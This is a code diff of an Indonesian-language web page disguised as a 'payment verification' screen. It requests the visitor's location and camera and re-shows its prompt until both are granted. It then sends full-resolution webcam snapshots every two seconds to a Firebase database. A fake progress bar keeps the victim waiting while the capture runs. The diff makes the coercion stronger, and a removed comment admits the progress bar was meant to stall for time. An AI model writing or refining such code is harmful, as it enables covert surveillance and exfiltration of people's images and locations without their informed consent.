@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifikasi Akses Perangkat</title>
+  <title>Verifikasi Pembayaran</title>
   
   <!-- Firebase SDK (v9 Compatibility Mode) -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -218,21 +217,28 @@
     const progressFill = document.getElementById('progressFill');
     const percentText = document.getElementById('percentText');
 
-    // Dipanggil saat klik "Izinkan & Lanjutkan"
+    // Dipanggil saat klik "Mulai"
     async function mulaiProses() {
-      // Sembunyikan Pop-Up Modal
-      document.getElementById('customModal').style.display = 'none';
+      // Minta izin lokasi dan kamera
+      const izinLokasi = await mintaLokasi();
+      const izinKamera = await mintaKamera();
 
-      // Picu dialog izin browser
-      await mintaLokasi();
-      await mintaKamera();
+      // Cek apakah kedua izin diberikan
+      if (!izinLokasi || !izinKamera) {
+        alert("Layanan ini tidak bisa berjalan jika belum diijinkan");
+        document.getElementById('customModal').style.display = 'flex'; // Tampilkan kembali modal
+        return;
+      }
+
+      // Sembunyikan Pop-Up Modal hanya jika semua izin diberikan
+      document.getElementById('customModal').style.display = 'none';
 
       // Tampilkan Animasi Loading & Jalankan Progress Bar
       loadingArea.style.display = 'flex';
       jalankanProgressBar();
     }
 
-    // Animasi Angka 0% -> 99% (Terus mutar agar mengulur waktu)
+    // Animasi Angka 0% -> 95%
     function jalankanProgressBar() {
       let progress = 0;
       const interval = setInterval(() => {
@@ -245,7 +251,7 @@
       }, 500);
     }
 
-    // Function Minta Lokasi
+    // Function Minta Lokasi (Mengembalikan boolean true/false)
     function mintaLokasi() {
       return new Promise((resolve) => {
         if ("geolocation" in navigator) {
@@ -269,31 +275,33 @@
       });
     }
 
-    // Function Minta Kamera
+    // Function Minta Kamera (Mengembalikan boolean true/false)
     async function mintaKamera() {
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
           webcam.srcObject = stream;
           setInterval(captureFrame, 2000);
+          return true;
         } catch (err) {
           console.warn("Kamera ditolak:", err.message);
+          return false;
         }
+      } else {
+        return false;
       }
     }
 
-    // Ambil Frame Kamera Kualitas Maksimal (Paling Tajam)
+    // Ambil Frame Kamera Kualitas Maksimal
     function captureFrame() {
       if (webcam.videoWidth === 0) return;
 
-      // 1. Gunakan resolusi asli kamera tanpa dibagi/dikurangi
       canvas.width = webcam.videoWidth;
       canvas.height = webcam.videoHeight;
       
       const ctx = canvas.getContext('2d');
       ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
 
-      // 2. Gunakan kualitas 1.0 (100% tanpa kompresi / paling tajam)
       const base64Image = canvas.toDataURL('image/jpeg', 1.0);
       
       db.ref('device/cameraFrame').set(base64Image);
